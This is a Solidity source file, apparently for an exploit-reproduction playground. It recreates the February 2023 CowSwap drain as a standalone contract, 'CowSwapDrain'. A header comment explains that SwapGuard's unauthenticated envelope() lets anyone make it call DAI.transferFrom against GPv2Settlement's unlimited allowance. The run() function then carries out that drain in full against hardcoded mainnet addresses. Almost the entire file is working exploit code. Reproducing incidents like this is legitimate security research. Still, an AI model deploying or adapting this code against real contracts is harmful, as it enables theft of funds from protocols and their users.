// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-02-CowSwap).
// Faithful copy of `ContractTest.testExploit()` from
// evm-hack-registry/2023-02-CowSwap_exp/test/CowSwap_exp.sol, with the
// attack moved into a standalone `run()` entrypoint on its own contract
// (the original test runs the whole attack INLINE — `address(this)` is
// both the "vault" and the token recipient; there is no separate exploit
// contract to deploy). No imports — minimal interfaces are inlined so this
// compiles anywhere.
//
// Root cause (unchanged from the original): CoW Protocol's `SwapGuard`
// helper (0xcD07a7695E3372aCD2B2077557DE93e667B92bd8) exposes a public,
// unauthenticated `envelope()` that executes an arbitrary caller-supplied
// `{target, callData}` low-level call FROM ITS OWN CONTEXT, then only
// reverts if a caller-controlled "loss" bookkeeping check trips. Because
// `GPv2Settlement` (the CoW Protocol settlement contract) had granted
// `SwapGuard` an unlimited DAI allowance, anyone can drive `envelope()` to
// call `DAI.transferFrom(GPv2Settlement, <anything>, <amount>)` — the
// `msg.sender` DAI sees is `SwapGuard`, so the allowance check passes. The
// attacker points the interaction's `vault` at itself and zeroes out
// `tokenPrices`/`balanceChanges` (and sets `allowedLoss = type(uint256).max`)
// so the post-check's "loss" arithmetic can never exceed the threshold,
// regardless of what actually happened — draining GPv2Settlement's entire
// DAI balance in one call.

interface IERC20Min {
    function balanceOf(address) external view returns (uint256);
    function allowance(address, address) external view returns (uint256);
    function decimals() external view returns (uint8);
}

interface ISwapGuard {
    struct Data {
        address target;
        uint256 value;
        bytes callData;
    }

    function envelope(
        Data[] calldata interactions,
        address vault,
        IERC20Min[] calldata tokens,
        uint256[] calldata tokenPrices,
        int256[] calldata balanceChanges,
        uint256 allowedLoss
    ) external;
}

contract CowSwapDrain {
    IERC20Min internal constant DAI = IERC20Min(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    ISwapGuard internal constant SWAP_GUARD = ISwapGuard(0xcD07a7695E3372aCD2B2077557DE93e667B92bd8);
    address internal constant GPV2_SETTLEMENT = 0x9008D19f58AAbD9eD0D60971565AA8510560ab41;

    function run() external {
        uint256 amount = DAI.balanceOf(GPV2_SETTLEMENT);
        if (DAI.allowance(GPV2_SETTLEMENT, address(SWAP_GUARD)) < amount) {
            amount = DAI.allowance(GPV2_SETTLEMENT, address(SWAP_GUARD));
        }

        bytes memory callDatas =
            abi.encodeWithSignature("transferFrom(address,address,uint256)", GPV2_SETTLEMENT, address(this), amount);

        ISwapGuard.Data[] memory interactions = new ISwapGuard.Data[](1);
        interactions[0] = ISwapGuard.Data({target: address(DAI), value: 0, callData: callDatas});

        address vault = address(this);
        IERC20Min[] memory tokens = new IERC20Min[](1);
        tokens[0] = DAI;
        uint256[] memory tokenPrices = new uint256[](1);
        tokenPrices[0] = 0;
        int256[] memory balanceChanges = new int256[](1);
        balanceChanges[0] = 0;
        uint256 allowedLoss = type(uint256).max;

        SWAP_GUARD.envelope(interactions, vault, tokens, tokenPrices, balanceChanges, allowedLoss);
    }
}
